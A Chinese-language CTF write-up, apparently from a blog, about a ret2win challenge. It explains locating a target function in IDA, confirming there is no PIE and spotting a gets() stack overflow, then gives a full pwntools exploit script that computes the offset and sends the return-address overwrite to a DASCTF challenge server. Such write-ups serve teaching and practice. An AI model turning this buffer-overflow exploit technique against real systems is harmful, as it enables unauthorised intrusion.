在ida中可以明显看到目标函数位于`0x40060D`
![](https://img.h1kari.cn/blog/images/5dd7b52850b5049dbcda23c2fd1e7e18682dbc8539f675e41515daab682af302.webp)

在main处可以注意到此处输出了目标函数的内存地址，实际运行后发现和ida中看到的地址一样，说明没有PIE
![](https://img.h1kari.cn/blog/images/c259d3851b858fe7ebec872abb8e565745a46335a120aa8f89424e31227b0483.webp)
![](https://img.h1kari.cn/blog/images/be04af4795a3cd4918e432eb07db10396c0c36865c2689d276bb1730f80711c1.webp)

关注main的逻辑，可以注意到gets这个函数，这个函数会引发栈溢出问题，且目标函数的位置也已经确定，那么整体思路就是，先使得其能发生栈溢出，随后覆盖main的返回地址。随后就能得到flag
![](https://img.h1kari.cn/blog/images/1d6ee136302c0256a5668c17c59f6cb97709412cc5682f4094a7ad79f5629ab0.webp)

注：此处exp利用cyclic方法获取offset
## EXP
```python
from pwn import *

context.arch = "amd64"

io = process("./1")
io.sendlineafter(b">", cyclic(200, n=8))
io.wait()
core = io.corefile
offset = cyclic_find(core.read(core.rsp, 8), n=8)

print(offset)

io = remote("1cada982c23b41b826ddf37a.tcp-ctf2.dasctf.com", 9999, ssl=True, sni="1cada982c23b41b826ddf37a.tcp-ctf2.dasctf.com")
io.recvuntil(b"WOW:")
payload = b"A" * offset + p64(0x4006A4) + p64(0x40060D)

io.sendlineafter(b">", payload)
io.interactive()

```
